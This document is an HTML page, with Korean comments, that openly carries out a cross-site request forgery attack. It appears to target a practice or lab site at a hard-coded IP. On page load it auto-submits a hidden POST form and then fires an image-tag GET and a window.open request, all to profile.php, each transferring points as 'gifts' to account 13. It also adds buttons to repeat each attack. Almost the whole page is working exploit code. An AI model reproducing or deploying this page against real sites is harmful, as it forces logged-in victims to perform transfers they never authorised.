<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🔥 최종 CSRF 우회</title>
</head>
<body>
    <h1>🎯 최종 CSRF 공격</h1>
    <div id="status">공격 준비 중...</div>
    
    <script>
        // 1. 현재 도메인에서 직접 요청 (Same-Origin)
        function directFormSubmit() {
            // 동적으로 폼 생성
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php?gift_to=13';
            form.target = '_blank'; // 새 창에서 열기
            
            // 필요한 필드들 추가
            const fields = {
                'send_gift': '1',
                'receiver_id': '13', 
                'gift_type': 'coffee',
                'points': '500',
                'message': 'CSRF테스트'
            };
            
            Object.keys(fields).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            });
            
            document.body.appendChild(form);
            
            // 즉시 제출
            form.submit();
            
            document.getElementById('status').innerHTML = '🚀 폼 제출 완료! 새 창 확인하세요.';
            console.log('CSRF 공격 폼 제출됨');
        }
        
        // 2. 이미지 태그로 GET 요청 시도
        function imageBasedAttack() {
            const img = new Image();
            img.src = 'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=flower&points=100&message=imgattack&gift_to=13&_=' + Date.now();
            
            img.onload = () => console.log('이미지 공격 성공');
            img.onerror = () => console.log('이미지 공격 시도됨 (에러는 정상)');
            
            document.body.appendChild(img);
        }
        
        // 3. 새 창에서 직접 이동
        function windowOpenAttack() {
            const url = 'http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=cake&points=200&message=newwindow&gift_to=13';
            window.open(url, 'csrf_attack', 'width=800,height=600');
        }
        
        // 페이지 로드 시 모든 공격 실행
        window.onload = function() {
            console.log('🔥 최종 CSRF 공격 시작');
            
            // 1초 간격으로 다양한 방법 시도
            setTimeout(directFormSubmit, 1000);
            setTimeout(imageBasedAttack, 3000);
            setTimeout(windowOpenAttack, 5000);
            
            // 수동 버튼도 추가
            document.body.innerHTML += `
                <br><br>
                <button onclick="directFormSubmit()">수동 폼 제출</button>
                <button onclick="imageBasedAttack()">이미지 공격</button>
                <button onclick="windowOpenAttack()">새창 공격</button>
            `;
        };
    </script>
</body>
</html>
